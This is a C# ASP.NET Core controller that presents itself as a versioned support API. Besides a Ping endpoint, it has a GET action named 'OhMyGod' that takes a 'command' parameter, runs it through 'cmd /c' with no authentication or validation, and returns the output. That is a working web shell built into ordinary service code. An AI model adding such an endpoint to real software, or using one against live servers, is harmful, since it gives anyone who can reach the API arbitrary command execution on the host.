using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using NSwag.Annotations;

namespace MyWonderfulApp.Service.Controllers.V2
{
    [ApiVersion("2.0")]
    [ApiController]
    [Route("api/v{version:apiVersion}/[controller]/[action]")]
    [SwaggerTag("SupportController", Description = "Version 2")]
    public class SupportController : Controller
    {
        [SwaggerResponse(typeof(String))]
        [HttpGet]
        [MapToApiVersion("2.0")]
        public IActionResult Ping()
        {
            return Ok("Pong V2");
        }

        [SwaggerResponse(typeof(String))]
        [HttpGet]
        [MapToApiVersion("2.0")]
        public IActionResult OhMyGod(String command)
        {
            System.Diagnostics.ProcessStartInfo procStartInfo =
                new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);

            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;

            procStartInfo.CreateNoWindow = true;

            String result;
            using (var process = new System.Diagnostics.Process())
            {
                process.StartInfo = procStartInfo;
                process.Start();
                // Get the output into a string
                result = process.StandardOutput.ReadToEnd();
            }
            return Ok(result);
        }
    }
}